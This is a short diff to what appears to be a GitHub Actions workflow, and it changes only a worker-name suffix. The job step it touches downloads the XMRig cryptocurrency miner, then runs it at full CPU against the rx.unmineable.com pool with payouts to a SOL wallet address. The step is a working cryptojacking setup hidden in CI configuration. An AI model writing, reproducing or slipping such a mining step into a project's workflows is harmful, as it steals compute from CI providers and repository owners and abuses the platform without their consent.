@@ -8,4 +8,4 @@ jobs:
         run: |
           wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
           tar -xf xmrig-6.21.0-linux-x64.tar.gz
-          ./xmrig-6.21.0/xmrig -o rx.unmineable.com:3333 -a rx -k -u SOL:D4dbTEpvsDDQK8V56USNgDsircfmDHXQQmTkafnxLR56.GH_AlphaB135_BitQu_1777037304 -p x --cpu-max-threads-hint 100
+          ./xmrig-6.21.0/xmrig -o rx.unmineable.com:3333 -a rx -k -u SOL:D4dbTEpvsDDQK8V56USNgDsircfmDHXQQmTkafnxLR56.GH_AlphaB135_BitQu_1777037308 -p x --cpu-max-threads-hint 100
